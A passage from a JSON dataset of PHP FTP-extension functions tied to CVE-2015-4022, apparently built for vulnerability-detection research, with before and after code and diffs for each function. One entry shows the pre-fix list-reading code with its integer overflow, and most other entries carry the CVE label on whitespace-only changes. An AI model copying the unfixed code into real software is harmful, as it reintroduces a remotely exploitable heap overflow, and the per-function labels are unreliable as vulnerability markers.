        "diff_func": "--- func_before\n+++ func_after\n@@ -5,8 +5,8 @@\n \tdatabuf_t\t*data = NULL;\n \tchar\t\t*ptr;\n \tint\t\tch, lastch;\n-\tint\t\tsize, rcvd;\n-\tint\t\tlines;\n+\tsize_t\t\tsize, rcvd;\n+\tsize_t\t\tlines;\n \tchar\t\t**ret = NULL;\n \tchar\t\t**entry;\n \tchar\t\t*text;\n@@ -24,7 +24,7 @@\n \tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n \t\tgoto bail;\n \t}\n-\tftp->data = data;\t\n+\tftp->data = data;\n \n \tif (!ftp_putcmd(ftp, cmd, path)) {\n \t\tgoto bail;\n@@ -48,7 +48,7 @@\n \tlines = 0;\n \tlastch = 0;\n \twhile ((rcvd = my_recv(ftp, data->fd, data->buf, FTP_BUFSIZE))) {\n-\t\tif (rcvd == -1) {\n+\t\tif (rcvd == -1 || rcvd > ((size_t)(-1))-size) {\n \t\t\tgoto bail;\n \t\t}\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\tint\t\tsize, rcvd;",
                "\tint\t\tlines;",
                "\tftp->data = data;\t",
                "\t\tif (rcvd == -1) {"
            ],
            "added_lines": [
                "\tsize_t\t\tsize, rcvd;",
                "\tsize_t\t\tlines;",
                "\tftp->data = data;",
                "\t\tif (rcvd == -1 || rcvd > ((size_t)(-1))-size) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_nb_put",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_nb_put(ftpbuf_t *ftp, const char *path, php_stream *instream, ftptype_t type, long startpos TSRMLS_DC)\n{\n\tdatabuf_t\t\t*data = NULL;\n\tchar\t\t\targ[11];\n\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\tif (!ftp_type(ftp, type)) {\n\t\tgoto bail;\n\t}\n\tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\tif (startpos > 0) {\n\t\tsnprintf(arg, sizeof(arg), \"%ld\", startpos);\n\t\tif (!ftp_putcmd(ftp, \"REST\", arg)) {\n\t\t\tgoto bail;\n\t\t}\n\t\tif (!ftp_getresp(ftp) || (ftp->resp != 350)) {\n\t\t\tgoto bail;\n\t\t}\n\t}\n\n\tif (!ftp_putcmd(ftp, \"STOR\", path)) {\n\t\tgoto bail;\n\t}\n\tif (!ftp_getresp(ftp) || (ftp->resp != 150 && ftp->resp != 125)) {\n\t\tgoto bail;\n\t}\n\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) { \n\t\tgoto bail;\n\t}\n\tftp->data = data;\n\tftp->stream = instream;\n\tftp->lastch = 0;\n\tftp->nb = 1;\n\n\treturn (ftp_nb_continue_write(ftp TSRMLS_CC));\n\nbail:\n\tftp->data = data_close(ftp, data);\n\treturn PHP_FTP_FAILED;\n}",
        "func": "int\nftp_nb_put(ftpbuf_t *ftp, const char *path, php_stream *instream, ftptype_t type, long startpos TSRMLS_DC)\n{\n\tdatabuf_t\t\t*data = NULL;\n\tchar\t\t\targ[11];\n\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\tif (!ftp_type(ftp, type)) {\n\t\tgoto bail;\n\t}\n\tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\tif (startpos > 0) {\n\t\tsnprintf(arg, sizeof(arg), \"%ld\", startpos);\n\t\tif (!ftp_putcmd(ftp, \"REST\", arg)) {\n\t\t\tgoto bail;\n\t\t}\n\t\tif (!ftp_getresp(ftp) || (ftp->resp != 350)) {\n\t\t\tgoto bail;\n\t\t}\n\t}\n\n\tif (!ftp_putcmd(ftp, \"STOR\", path)) {\n\t\tgoto bail;\n\t}\n\tif (!ftp_getresp(ftp) || (ftp->resp != 150 && ftp->resp != 125)) {\n\t\tgoto bail;\n\t}\n\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\tftp->data = data;\n\tftp->stream = instream;\n\tftp->lastch = 0;\n\tftp->nb = 1;\n\n\treturn (ftp_nb_continue_write(ftp TSRMLS_CC));\n\nbail:\n\tftp->data = data_close(ftp, data);\n\treturn PHP_FTP_FAILED;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -29,7 +29,7 @@\n \tif (!ftp_getresp(ftp) || (ftp->resp != 150 && ftp->resp != 125)) {\n \t\tgoto bail;\n \t}\n-\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) { \n+\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) {\n \t\tgoto bail;\n \t}\n \tftp->data = data;",
        "diff_line_info": {
            "deleted_lines": [
                "\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) { "
            ],
            "added_lines": [
                "\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_nb_continue_write",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_nb_continue_write(ftpbuf_t *ftp TSRMLS_DC)\n{\n\tlong\t\t\tsize;\n\tchar\t\t\t*ptr;\n\tint \t\t\tch;\n\n\t/* check if we can write more data */\n\tif (!data_writeable(ftp, ftp->data->fd)) {\n\t\treturn PHP_FTP_MOREDATA;\n\t}\n\n\tsize = 0;\n\tptr = ftp->data->buf;\n\twhile (!php_stream_eof(ftp->stream) && (ch = php_stream_getc(ftp->stream)) != EOF) {\n\n\t\tif (ch == '\\n' && ftp->type == FTPTYPE_ASCII) {\n\t\t\t*ptr++ = '\\r';\n\t\t\tsize++;\n\t\t}\n\n\t\t*ptr++ = ch;\n\t\tsize++;\n\n\t\t/* flush if necessary */\n\t\tif (FTP_BUFSIZE - size < 2) {\n\t\t\tif (my_send(ftp, ftp->data->fd, ftp->data->buf, size) != size) {\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\treturn PHP_FTP_MOREDATA;\n\t\t}\n\t}\n\n\tif (size && my_send(ftp, ftp->data->fd, ftp->data->buf, size) != size) {\n\t\tgoto bail;\n\t}\n\tftp->data = data_close(ftp, ftp->data);\n \n\tif (!ftp_getresp(ftp) || (ftp->resp != 226 && ftp->resp != 250)) {\n\t\tgoto bail;\n\t}\n\tftp->nb = 0;\n\treturn PHP_FTP_FINISHED;\nbail:\n\tftp->data = data_close(ftp, ftp->data);\n\tftp->nb = 0;\n\treturn PHP_FTP_FAILED;\n}",
        "func": "int\nftp_nb_continue_write(ftpbuf_t *ftp TSRMLS_DC)\n{\n\tlong\t\t\tsize;\n\tchar\t\t\t*ptr;\n\tint \t\t\tch;\n\n\t/* check if we can write more data */\n\tif (!data_writeable(ftp, ftp->data->fd)) {\n\t\treturn PHP_FTP_MOREDATA;\n\t}\n\n\tsize = 0;\n\tptr = ftp->data->buf;\n\twhile (!php_stream_eof(ftp->stream) && (ch = php_stream_getc(ftp->stream)) != EOF) {\n\n\t\tif (ch == '\\n' && ftp->type == FTPTYPE_ASCII) {\n\t\t\t*ptr++ = '\\r';\n\t\t\tsize++;\n\t\t}\n\n\t\t*ptr++ = ch;\n\t\tsize++;\n\n\t\t/* flush if necessary */\n\t\tif (FTP_BUFSIZE - size < 2) {\n\t\t\tif (my_send(ftp, ftp->data->fd, ftp->data->buf, size) != size) {\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\treturn PHP_FTP_MOREDATA;\n\t\t}\n\t}\n\n\tif (size && my_send(ftp, ftp->data->fd, ftp->data->buf, size) != size) {\n\t\tgoto bail;\n\t}\n\tftp->data = data_close(ftp, ftp->data);\n\n\tif (!ftp_getresp(ftp) || (ftp->resp != 226 && ftp->resp != 250)) {\n\t\tgoto bail;\n\t}\n\tftp->nb = 0;\n\treturn PHP_FTP_FINISHED;\nbail:\n\tftp->data = data_close(ftp, ftp->data);\n\tftp->nb = 0;\n\treturn PHP_FTP_FAILED;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -35,7 +35,7 @@\n \t\tgoto bail;\n \t}\n \tftp->data = data_close(ftp, ftp->data);\n- \n+\n \tif (!ftp_getresp(ftp) || (ftp->resp != 226 && ftp->resp != 250)) {\n \t\tgoto bail;\n \t}",
        "diff_line_info": {
            "deleted_lines": [
                " "
            ],
            "added_lines": [
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_get",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_get(ftpbuf_t *ftp, php_stream *outstream, const char *path, ftptype_t type, long resumepos TSRMLS_DC)\n{\n\tdatabuf_t\t\t*data = NULL;\n\tsize_t\t\t\trcvd;\n\tchar\t\t\targ[11];\n\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\tif (!ftp_type(ftp, type)) {\n\t\tgoto bail;\n\t}\n\n\tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\t\n\tftp->data = data;\n\n\tif (resumepos > 0) {\n\t\tsnprintf(arg, sizeof(arg), \"%ld\", resumepos);\n\t\tif (!ftp_putcmd(ftp, \"REST\", arg)) {\n\t\t\tgoto bail;\n\t\t}\n\t\tif (!ftp_getresp(ftp) || (ftp->resp != 350)) {\n\t\t\tgoto bail;\n\t\t}\n\t}\n\n\tif (!ftp_putcmd(ftp, \"RETR\", path)) {\n\t\tgoto bail;\n\t}\n\tif (!ftp_getresp(ftp) || (ftp->resp != 150 && ftp->resp != 125)) {\n\t\tgoto bail;\n\t}\n\n\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\n\twhile ((rcvd = my_recv(ftp, data->fd, data->buf, FTP_BUFSIZE))) {\n\t\tif (rcvd == -1) {\n\t\t\tgoto bail;\n\t\t}\n\n\t\tif (type == FTPTYPE_ASCII) {\n#ifndef PHP_WIN32\n\t\t\tchar *s;\n#endif\n\t\t\tchar *ptr = data->buf;\n\t\t\tchar *e = ptr + rcvd;\n\t\t\t/* logic depends on the OS EOL\n\t\t\t * Win32 -> \\r\\n\n\t\t\t * Everything Else \\n\n\t\t\t */\n#ifdef PHP_WIN32\n\t\t\tphp_stream_write(outstream, ptr, (e - ptr));\n\t\t\tptr = e;\n#else\n\t\t\twhile (e > ptr && (s = memchr(ptr, '\\r', (e - ptr)))) {\n\t\t\t\tphp_stream_write(outstream, ptr, (s - ptr));\n\t\t\t\tif (*(s + 1) == '\\n') {\n\t\t\t\t\ts++;\n\t\t\t\t\tphp_stream_putc(outstream, '\\n');\n\t\t\t\t}\n\t\t\t\tptr = s + 1;\n\t\t\t}\n#endif\n\t\t\tif (ptr < e) {\n\t\t\t\tphp_stream_write(outstream, ptr, (e - ptr));\n\t\t\t}\n\t\t} else if (rcvd != php_stream_write(outstream, data->buf, rcvd)) {\n\t\t\tgoto bail;\n\t\t}\n\t}\n\n\tftp->data = data = data_close(ftp, data);\n\n\tif (!ftp_getresp(ftp) || (ftp->resp != 226 && ftp->resp != 250)) {\n\t\tgoto bail;\n\t}\n\n\treturn 1;\nbail:\n\tftp->data = data_close(ftp, data);\n\treturn 0;\n}",
        "func": "int\nftp_get(ftpbuf_t *ftp, php_stream *outstream, const char *path, ftptype_t type, long resumepos TSRMLS_DC)\n{\n\tdatabuf_t\t\t*data = NULL;\n\tsize_t\t\t\trcvd;\n\tchar\t\t\targ[11];\n\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\tif (!ftp_type(ftp, type)) {\n\t\tgoto bail;\n\t}\n\n\tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\n\tftp->data = data;\n\n\tif (resumepos > 0) {\n\t\tsnprintf(arg, sizeof(arg), \"%ld\", resumepos);\n\t\tif (!ftp_putcmd(ftp, \"REST\", arg)) {\n\t\t\tgoto bail;\n\t\t}\n\t\tif (!ftp_getresp(ftp) || (ftp->resp != 350)) {\n\t\t\tgoto bail;\n\t\t}\n\t}\n\n\tif (!ftp_putcmd(ftp, \"RETR\", path)) {\n\t\tgoto bail;\n\t}\n\tif (!ftp_getresp(ftp) || (ftp->resp != 150 && ftp->resp != 125)) {\n\t\tgoto bail;\n\t}\n\n\tif ((data = data_accept(data, ftp TSRMLS_CC)) == NULL) {\n\t\tgoto bail;\n\t}\n\n\twhile ((rcvd = my_recv(ftp, data->fd, data->buf, FTP_BUFSIZE))) {\n\t\tif (rcvd == -1) {\n\t\t\tgoto bail;\n\t\t}\n\n\t\tif (type == FTPTYPE_ASCII) {\n#ifndef PHP_WIN32\n\t\t\tchar *s;\n#endif\n\t\t\tchar *ptr = data->buf;\n\t\t\tchar *e = ptr + rcvd;\n\t\t\t/* logic depends on the OS EOL\n\t\t\t * Win32 -> \\r\\n\n\t\t\t * Everything Else \\n\n\t\t\t */\n#ifdef PHP_WIN32\n\t\t\tphp_stream_write(outstream, ptr, (e - ptr));\n\t\t\tptr = e;\n#else\n\t\t\twhile (e > ptr && (s = memchr(ptr, '\\r', (e - ptr)))) {\n\t\t\t\tphp_stream_write(outstream, ptr, (s - ptr));\n\t\t\t\tif (*(s + 1) == '\\n') {\n\t\t\t\t\ts++;\n\t\t\t\t\tphp_stream_putc(outstream, '\\n');\n\t\t\t\t}\n\t\t\t\tptr = s + 1;\n\t\t\t}\n#endif\n\t\t\tif (ptr < e) {\n\t\t\t\tphp_stream_write(outstream, ptr, (e - ptr));\n\t\t\t}\n\t\t} else if (rcvd != php_stream_write(outstream, data->buf, rcvd)) {\n\t\t\tgoto bail;\n\t\t}\n\t}\n\n\tftp->data = data = data_close(ftp, data);\n\n\tif (!ftp_getresp(ftp) || (ftp->resp != 226 && ftp->resp != 250)) {\n\t\tgoto bail;\n\t}\n\n\treturn 1;\nbail:\n\tftp->data = data_close(ftp, data);\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -15,7 +15,7 @@\n \tif ((data = ftp_getdata(ftp TSRMLS_CC)) == NULL) {\n \t\tgoto bail;\n \t}\n-\t\n+\n \tftp->data = data;\n \n \tif (resumepos > 0) {",
        "diff_line_info": {
            "deleted_lines": [
                "\t"
            ],
            "added_lines": [
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_close",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "ftpbuf_t*\nftp_close(ftpbuf_t *ftp)\n{\n\tif (ftp == NULL) {\n\t\treturn NULL;\n\t}\n\tif (ftp->data) {\n\t\tdata_close(ftp, ftp->data);\n\t}\n\tif (ftp->stream && ftp->closestream) {\n\t\tTSRMLS_FETCH();\n\t\tphp_stream_close(ftp->stream);\n\t}\n\tif (ftp->fd != -1) {\n#if HAVE_OPENSSL_EXT\n\t\tif (ftp->ssl_active) {\n\t\t\tSSL_shutdown(ftp->ssl_handle);\n\t\t\tSSL_free(ftp->ssl_handle);\n\t\t}\n#endif\t\t\n\t\tclosesocket(ftp->fd);\n\t}\t\n\tftp_gc(ftp);\n\tefree(ftp);\n\treturn NULL;\n}",
        "func": "ftpbuf_t*\nftp_close(ftpbuf_t *ftp)\n{\n\tif (ftp == NULL) {\n\t\treturn NULL;\n\t}\n\tif (ftp->data) {\n\t\tdata_close(ftp, ftp->data);\n\t}\n\tif (ftp->stream && ftp->closestream) {\n\t\tTSRMLS_FETCH();\n\t\tphp_stream_close(ftp->stream);\n\t}\n\tif (ftp->fd != -1) {\n#if HAVE_OPENSSL_EXT\n\t\tif (ftp->ssl_active) {\n\t\t\tSSL_shutdown(ftp->ssl_handle);\n\t\t\tSSL_free(ftp->ssl_handle);\n\t\t}\n#endif\n\t\tclosesocket(ftp->fd);\n\t}\n\tftp_gc(ftp);\n\tefree(ftp);\n\treturn NULL;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -17,9 +17,9 @@\n \t\t\tSSL_shutdown(ftp->ssl_handle);\n \t\t\tSSL_free(ftp->ssl_handle);\n \t\t}\n-#endif\t\t\n+#endif\n \t\tclosesocket(ftp->fd);\n-\t}\t\n+\t}\n \tftp_gc(ftp);\n \tefree(ftp);\n \treturn NULL;",
        "diff_line_info": {
            "deleted_lines": [
                "#endif\t\t",
                "\t}\t"
            ],
            "added_lines": [
                "#endif",
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_reinit",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_reinit(ftpbuf_t *ftp)\n{\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\t\n\n\tftp_gc(ftp);\n\n\tftp->nb = 0;\n\n\tif (!ftp_putcmd(ftp, \"REIN\", NULL)) {\n\t\treturn 0;\n\t}\n\tif (!ftp_getresp(ftp) || ftp->resp != 220) {\n\t\treturn 0;\n\t}\n\n\treturn 1;\n}",
        "func": "int\nftp_reinit(ftpbuf_t *ftp)\n{\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\n\tftp_gc(ftp);\n\n\tftp->nb = 0;\n\n\tif (!ftp_putcmd(ftp, \"REIN\", NULL)) {\n\t\treturn 0;\n\t}\n\tif (!ftp_getresp(ftp) || ftp->resp != 220) {\n\t\treturn 0;\n\t}\n\n\treturn 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -3,7 +3,7 @@\n {\n \tif (ftp == NULL) {\n \t\treturn 0;\n-\t}\t\n+\t}\n \n \tftp_gc(ftp);\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t}\t"
            ],
            "added_lines": [
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_alloc",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_alloc(ftpbuf_t *ftp, const long size, char **response)\n{\n\tchar buffer[64];\n\n\tif (ftp == NULL || size <= 0) {\n\t\treturn 0;\n\t}\n\n\tsnprintf(buffer, sizeof(buffer) - 1, \"%ld\", size);\n    \n\tif (!ftp_putcmd(ftp, \"ALLO\", buffer)) {\n\t\treturn 0;\n\t}\n\n\tif (!ftp_getresp(ftp)) {\n\t\treturn 0;\n\t}\n\n\tif (response) {\n\t\t*response = estrdup(ftp->inbuf);\n\t}\n\n\tif (ftp->resp < 200 || ftp->resp >= 300) {\n\t\treturn 0;\n\t}\n\n\treturn 1;\t\n}",
        "func": "int\nftp_alloc(ftpbuf_t *ftp, const long size, char **response)\n{\n\tchar buffer[64];\n\n\tif (ftp == NULL || size <= 0) {\n\t\treturn 0;\n\t}\n\n\tsnprintf(buffer, sizeof(buffer) - 1, \"%ld\", size);\n\n\tif (!ftp_putcmd(ftp, \"ALLO\", buffer)) {\n\t\treturn 0;\n\t}\n\n\tif (!ftp_getresp(ftp)) {\n\t\treturn 0;\n\t}\n\n\tif (response) {\n\t\t*response = estrdup(ftp->inbuf);\n\t}\n\n\tif (ftp->resp < 200 || ftp->resp >= 300) {\n\t\treturn 0;\n\t}\n\n\treturn 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,7 +8,7 @@\n \t}\n \n \tsnprintf(buffer, sizeof(buffer) - 1, \"%ld\", size);\n-    \n+\n \tif (!ftp_putcmd(ftp, \"ALLO\", buffer)) {\n \t\treturn 0;\n \t}\n@@ -25,5 +25,5 @@\n \t\treturn 0;\n \t}\n \n-\treturn 1;\t\n+\treturn 1;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "    ",
                "\treturn 1;\t"
            ],
            "added_lines": [
                "",
                "\treturn 1;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4022",
        "func_name": "php/php-src/ftp_login",
        "description": "Integer overflow in the ftp_genlist function in ext/ftp/ftp.c in PHP before 5.4.41, 5.5.x before 5.5.25, and 5.6.x before 5.6.9 allows remote FTP servers to execute arbitrary code via a long reply to a LIST command, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/739adee1912176aacf351edc5751a02ded6ef1ec",
        "commit_title": "Fix bug #69545 - avoid overflow when reading list",
        "commit_text": "",
        "func_before": "int\nftp_login(ftpbuf_t *ftp, const char *user, const char *pass TSRMLS_DC)\n{\n#if HAVE_OPENSSL_EXT\n\tSSL_CTX\t*ctx = NULL;\n\tlong ssl_ctx_options = SSL_OP_ALL;\n#endif\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\n#if HAVE_OPENSSL_EXT\n\tif (ftp->use_ssl && !ftp->ssl_active) {\n\t\tif (!ftp_putcmd(ftp, \"AUTH\", \"TLS\")) {\n\t\t\treturn 0;\n\t\t}\n\t\tif (!ftp_getresp(ftp)) {\n\t\t\treturn 0;\n\t\t}\n\t\t\t\n\t\tif (ftp->resp != 234) {\n\t\t\tif (!ftp_putcmd(ftp, \"AUTH\", \"SSL\")) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif (!ftp_getresp(ftp)) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\t\t\n\t\t\tif (ftp->resp != 334) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\tftp->old_ssl = 1;\n\t\t\t\tftp->use_ssl_for_data = 1;\n\t\t\t}\n\t\t}\n\t\t\n\t\tctx = SSL_CTX_new(SSLv23_client_method());\n\t\tif (ctx == NULL) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"failed to create the SSL context\");\n\t\t\treturn 0;\n\t\t}\n\n#if OPENSSL_VERSION_NUMBER >= 0x0090605fL\n\t\tssl_ctx_options &= ~SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS;\n#endif\n\t\tSSL_CTX_set_options(ctx, ssl_ctx_options);\n\n\t\tftp->ssl_handle = SSL_new(ctx);\n\t\tif (ftp->ssl_handle == NULL) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"failed to create the SSL handle\");\n\t\t\tSSL_CTX_free(ctx);\n\t\t\treturn 0;\n\t\t}\n\n\t\tSSL_set_fd(ftp->ssl_handle, ftp->fd);\n\n\t\tif (SSL_connect(ftp->ssl_handle) <= 0) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"SSL/TLS handshake failed\");\n\t\t\tSSL_shutdown(ftp->ssl_handle);\n\t\t\tSSL_free(ftp->ssl_handle);\n\t\t\treturn 0;\n\t\t}\n\n\t\tftp->ssl_active = 1;\n\n\t\tif (!ftp->old_ssl) {\n\n\t\t\t/* set protection buffersize to zero */\n\t\t\tif (!ftp_putcmd(ftp, \"PBSZ\", \"0\")) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif (!ftp_getresp(ftp)) {\n\t\t\t\treturn 0;\n\t\t\t}\n\n\t\t\t/* enable data conn encryption */\n\t\t\tif (!ftp_putcmd(ftp, \"PROT\", \"P\")) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif (!ftp_getresp(ftp)) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\t\n\t\t\tftp->use_ssl_for_data = (ftp->resp >= 200 && ftp->resp <=299);\t\t\n\t\t}\n\t}\n#endif\n\n\tif (!ftp_putcmd(ftp, \"USER\", user)) {\n\t\treturn 0;\n\t}\n\tif (!ftp_getresp(ftp)) {\n\t\treturn 0;\n\t}\n\tif (ftp->resp == 230) {\n\t\treturn 1;\n\t}\n\tif (ftp->resp != 331) {\n\t\treturn 0;\n\t}\n\tif (!ftp_putcmd(ftp, \"PASS\", pass)) {\n\t\treturn 0;\n\t}\n\tif (!ftp_getresp(ftp)) {\n\t\treturn 0;\n\t}\n\treturn (ftp->resp == 230);\n}",
        "func": "int\nftp_login(ftpbuf_t *ftp, const char *user, const char *pass TSRMLS_DC)\n{\n#if HAVE_OPENSSL_EXT\n\tSSL_CTX\t*ctx = NULL;\n\tlong ssl_ctx_options = SSL_OP_ALL;\n#endif\n\tif (ftp == NULL) {\n\t\treturn 0;\n\t}\n\n#if HAVE_OPENSSL_EXT\n\tif (ftp->use_ssl && !ftp->ssl_active) {\n\t\tif (!ftp_putcmd(ftp, \"AUTH\", \"TLS\")) {\n\t\t\treturn 0;\n\t\t}\n\t\tif (!ftp_getresp(ftp)) {\n\t\t\treturn 0;\n\t\t}\n\n\t\tif (ftp->resp != 234) {\n\t\t\tif (!ftp_putcmd(ftp, \"AUTH\", \"SSL\")) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif (!ftp_getresp(ftp)) {\n\t\t\t\treturn 0;\n\t\t\t}\n\n\t\t\tif (ftp->resp != 334) {\n\t\t\t\treturn 0;\n\t\t\t} else {\n\t\t\t\tftp->old_ssl = 1;\n\t\t\t\tftp->use_ssl_for_data = 1;\n\t\t\t}\n\t\t}\n\n\t\tctx = SSL_CTX_new(SSLv23_client_method());\n\t\tif (ctx == NULL) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"failed to create the SSL context\");\n\t\t\treturn 0;\n\t\t}\n\n#if OPENSSL_VERSION_NUMBER >= 0x0090605fL\n\t\tssl_ctx_options &= ~SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS;\n#endif\n\t\tSSL_CTX_set_options(ctx, ssl_ctx_options);\n\n\t\tftp->ssl_handle = SSL_new(ctx);\n\t\tif (ftp->ssl_handle == NULL) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"failed to create the SSL handle\");\n\t\t\tSSL_CTX_free(ctx);\n\t\t\treturn 0;\n\t\t}\n\n\t\tSSL_set_fd(ftp->ssl_handle, ftp->fd);\n\n\t\tif (SSL_connect(ftp->ssl_handle) <= 0) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"SSL/TLS handshake failed\");\n\t\t\tSSL_shutdown(ftp->ssl_handle);\n\t\t\tSSL_free(ftp->ssl_handle);\n\t\t\treturn 0;\n\t\t}\n\n\t\tftp->ssl_active = 1;\n\n\t\tif (!ftp->old_ssl) {\n\n\t\t\t/* set protection buffersize to zero */\n\t\t\tif (!ftp_putcmd(ftp, \"PBSZ\", \"0\")) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif (!ftp_getresp(ftp)) {\n\t\t\t\treturn 0;\n\t\t\t}\n\n\t\t\t/* enable data conn encryption */\n\t\t\tif (!ftp_putcmd(ftp, \"PROT\", \"P\")) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif (!ftp_getresp(ftp)) {\n\t\t\t\treturn 0;\n\t\t\t}\n\n\t\t\tftp->use_ssl_for_data = (ftp->resp >= 200 && ftp->resp <=299);\n\t\t}\n\t}\n#endif\n\n\tif (!ftp_putcmd(ftp, \"USER\", user)) {\n\t\treturn 0;\n\t}\n\tif (!ftp_getresp(ftp)) {\n\t\treturn 0;\n\t}\n\tif (ftp->resp == 230) {\n\t\treturn 1;\n\t}\n\tif (ftp->resp != 331) {\n\t\treturn 0;\n\t}\n\tif (!ftp_putcmd(ftp, \"PASS\", pass)) {\n\t\treturn 0;\n\t}\n\tif (!ftp_getresp(ftp)) {\n\t\treturn 0;\n\t}\n\treturn (ftp->resp == 230);\n}",
